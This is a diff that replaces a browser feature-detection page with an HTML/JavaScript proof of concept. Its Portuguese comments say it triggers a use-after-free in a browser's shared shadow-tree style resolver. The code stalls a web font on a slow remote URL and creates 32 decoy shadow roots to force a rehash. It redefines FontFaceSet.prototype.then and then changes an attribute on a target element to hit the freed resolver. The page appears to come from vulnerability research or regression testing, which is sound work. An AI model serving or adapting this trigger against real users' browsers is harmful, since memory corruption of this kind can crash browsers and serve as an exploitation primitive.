@@ -1,67 +1,86 @@
-
 <!DOCTYPE html>
-<html>
 <body>
-<pre id="out"></pre>
+<pre id="log"></pre>
 <script>
-(function(){
-var tests={
-"ArrayBuffer":typeof ArrayBuffer,
-"Uint8Array":typeof Uint8Array,
-"Uint16Array":typeof Uint16Array,
-"Float32Array":typeof Float32Array,
-"BigInt":typeof BigInt,
-"DataView":typeof DataView,
-"setBigUint64":typeof DataView!=="undefined"?typeof DataView.prototype.setBigUint64:"absent",
-"SharedArrayBuffer":typeof SharedArrayBuffer,
-"WebAssembly":typeof WebAssembly,
-"Worker":typeof Worker,
-"SharedWorker":typeof SharedWorker,
-"MessageChannel":typeof MessageChannel,
-"MutationObserver":typeof MutationObserver,
-"ResizeObserver":typeof ResizeObserver,
-"IntersectionObserver":typeof IntersectionObserver,
-"OffscreenCanvas":typeof OffscreenCanvas,
-"HTMLCanvasElement":typeof HTMLCanvasElement,
-"Canvas2D":typeof CanvasRenderingContext2D,
-"ImageBitmap":typeof ImageBitmap,
-"VideoEncoder":typeof VideoEncoder,
-"VideoDecoder":typeof VideoDecoder,
-"VideoFrame":typeof VideoFrame,
-"AudioContext":typeof AudioContext,
-"webkitAudioContext":typeof webkitAudioContext,
-"HTMLAudioElement":typeof HTMLAudioElement,
-"HTMLVideoElement":typeof HTMLVideoElement,
-"FontFace":typeof FontFace,
-"FontFaceSet":typeof FontFaceSet,
-"DOMParser":typeof DOMParser,
-"XMLSerializer":typeof XMLSerializer,
-"ShadowRoot":typeof ShadowRoot,
-"attachShadow":typeof Element.prototype.attachShadow,
-"createShadowRoot":typeof Element.prototype.createShadowRoot,
-"getRootNode":typeof Node.prototype.getRootNode,
-"setHTMLUnsafe":typeof Element.prototype.setHTMLUnsafe,
-"replaceChildren":typeof Element.prototype.replaceChildren,
-"createImageBitmap":typeof createImageBitmap,
-"Path2D":typeof Path2D,
-"WebGL":typeof WebGLRenderingContext,
-"WebGL2":typeof WebGL2RenderingContext,
-"TextEncoder":typeof TextEncoder,
-"TextDecoder":typeof TextDecoder,
-"ReadableStream":typeof ReadableStream,
-"structuredClone":typeof structuredClone,
-"AbortController":typeof AbortController,
-"WeakRef":typeof WeakRef,
-"FinalizationRegistry":typeof FinalizationRegistry,
-"requestIdleCallback":typeof requestIdleCallback,
-"queueMicrotask":typeof queueMicrotask,
-"requestAnimationFrame":typeof requestAnimationFrame
-};
-var result=[];
-for(var key in tests)
-result.push(key+": "+tests[key]);
-document.getElementById("out").textContent=result.join("\n");
-})();
+function log(msg) { document.getElementById("log").append(msg + "\n"); }
+
+document.fonts;
+
+const FONT_URL = "https://slowfil.es/file?type=woff2&delay=120000";
+const FAMILY   = "TestFontB";
+const N = 32; // número de decoys para forçar o rehash
+
+window.addEventListener("load", () => setTimeout(() => {
+
+    // Shadow A: usa a fonte, força font loading
+    const hostA = document.createElement("div");
+    document.body.appendChild(hostA);
+    const rootA = hostA.attachShadow({ mode: "open" });
+    rootA.innerHTML =
+        `<style>@font-face{font-family:${FAMILY};src:url("${FONT_URL}")}` +
+        `.p{font:24px ${FAMILY}}</style><span class="p">A</span>`;
+
+    // Shadow B: alvo — tem @font-face + style removível
+    const hostB = document.createElement("div");
+    hostB.style.display = "none";
+    document.body.appendChild(hostB);
+    const rootB = hostB.attachShadow({ mode: "open" });
+    const gadgetStyle = document.createElement("style");
+    gadgetStyle.textContent = ".gadget { color: navy; }";
+    rootB.appendChild(gadgetStyle);
+    const fontStyle = document.createElement("style");
+    fontStyle.textContent =
+        `@font-face{font-family:${FAMILY};src:url("${FONT_URL}")}` +
+        `.p{font:24px ${FAMILY}}`;
+    rootB.appendChild(fontStyle);
+    const target = document.createElement("span");
+    target.textContent = "B";
+    rootB.appendChild(target);
+
+    // 32 decoys: cada um com style único — ao serem reconstruídos crescem o mapa
+    const decoys = Array.from({ length: N }, (_, i) => {
+        const h = document.createElement("div");
+        h.style.display = "none";
+        document.body.appendChild(h);
+        const r = h.attachShadow({ mode: "open" });
+        const s = document.createElement("style");
+        s.textContent = `.d${i} { color: rgb(${i},1,2); }`;
+        r.appendChild(s);
+        r.appendChild(document.createElement("span"));
+        return { root: r, style: s };
+    });
+
+    document.body.offsetHeight; // força layout inicial
+    document.fonts.load(`24px ${FAMILY}`, "A");
+
+    if (document.fonts.status !== "loading") {
+        log("SKIP: fonte nao esta em loading — tente aumentar o delay ou verificar conexao");
+        return;
+    }
+
+    document.fonts.ready; // materializa a promise
+
+    Object.defineProperty(FontFaceSet.prototype, "then", {
+        configurable: true,
+        get() {
+            delete FontFaceSet.prototype.then;
+            // força construção de 32 novos resolvers ? mapa cresce ? rehash
+            document.body.offsetHeight;
+            return undefined;
+        }
+    });
+
+    // Forçar Reconstruct (remove, não append):
+    decoys.forEach(d => d.style.remove());
+    gadgetStyle.remove();
+
+    document.styleSheets.length; // flush — dropa resolvers existentes
+
+    // Invalidação por atributo ? createOrFindSharedShadowTreeResolver ? UAF
+    target.id = "boom";
+
+    log("VIVO — sem crash (bug nao presente ou ja corrigido)");
+
+}, 0));
 </script>
 </body>
-</html>
